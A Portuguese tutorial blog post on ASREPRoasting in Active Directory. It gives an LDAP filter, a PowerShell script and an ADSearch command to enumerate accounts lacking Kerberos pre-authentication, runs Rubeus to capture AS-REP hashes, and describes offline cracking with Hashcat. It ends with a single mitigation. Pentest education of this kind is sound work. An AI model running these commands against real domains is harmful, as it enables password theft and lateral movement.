---
title: "ASREPRoasting"
excerpt: "Teoria e prática sobre ASREPRoasting."
categories:
  - Hacking
tags:
  - ASREPRoasting
  - Active Directory
  - SPN
  - LDAP
  - ADSearch
  - Rubeus
  - Hahscat

toc: true
---

## Teoria

ASREPRoasting é um ataque no ambiente do Active Directory que explora um recurso do protocolo de autenticação Kerberos chamado AS-REP (Authentication Service Reply).

As contas que não necessitam de pré-autenticação (atributo  DONT_REQ_PREAUTH ativado) estão suscetíveis a esse tipo de ataque. Um invasor pode solicitar um ticket Kerberos KRB_AS_REQ sem o autenticador para qualquer usuário que não tenha o recurso de pré-autenticação habilitado.

Em posse da resposta KRB_AS_REP do controlador de domínio, o invasor pode descobrir a senha da vítima com ataque de força bruta offline, usando John The Ripper com o modo `krb5asrep` ou com Hashcat.

**OBS: Com a senha, a movimentação lateral se torna possível.**

![Untitled](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/a4b7ca11-3a48-40f7-9d40-0729fcc7f9d5)

## Extração de Contas Sem Pré-autenticação com LDAP

Pode-se realizar um filtro LDAP para extrair as contas que não necessitam de pré-autenticação Keberos:


```powershell
(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)
```

![Untitled 1](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/53d7eea2-028a-4c9c-adcf-3939d025d04e)

![Untitled 2](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/86342000-9f25-4563-b951-7d68a08e7ddb)

Essas são as 3 contas sem pré-autenticação.

## Extração de Contas Sem Pré-autenticação com Powershell

O mesmo filtro será usado através de um script poweshell.

```powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.Filter = "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$results = $search.FindAll()

foreach ($result in $results) {
    $userEntry = $result.GetDirectoryEntry()
    $uac = $userEntry.Properties["userAccountControl"].Value
    $doNotReqKerbPreauth = if ($uac -band 4194304) { $true } else { $false }

    Write-Host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"
    Write-Host "DoNotReqKerbPreauth : $doNotReqKerbPreauth"
    Write-Host ""
}
```

![Untitled 3](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/0f119196-d44d-480a-83c2-80c3a52f13b7)

## Extração de Contas Sem Pré-autenticação com ADSearch

```powershell
ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

![Untitled 4](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/a993229e-1e96-4d81-932d-aa9f46bfcdf0)

## Ataque

O ASREPRoasting pode ser realizado através do Rubeus:

```powershell
Rubeus.exe asreproast /nowrap
```

- A opção “nowrap” remove a quebra de linha (não obrigatório).

![Untitled 5](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/eb2a16b1-7f98-4d79-bdbc-aec11f914cd1)

## Quebrando a Senha

O Hashcat será usado para quebrar a senha.

![Untitled 6](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/33dd8409-071b-49e6-9e37-4320447b14ff)

- A configuração “-m 18200” é para quebrar senhas Kerberos 5 AS-REP (etype 23).
- O arquivo “maxraybrandt-asreproast” possui o hash encontrado.
- O arquivo “pass” contém as possíveis senhas.

![Untitled 7](https://github.com/BieAnimaton/BieAnimaton/assets/52220244/b6ee7bb4-334d-4f80-9909-7104339c9864)

## Medidas de Proteção

- Ativar a pré-autenticação Kerberos para todos os usuários.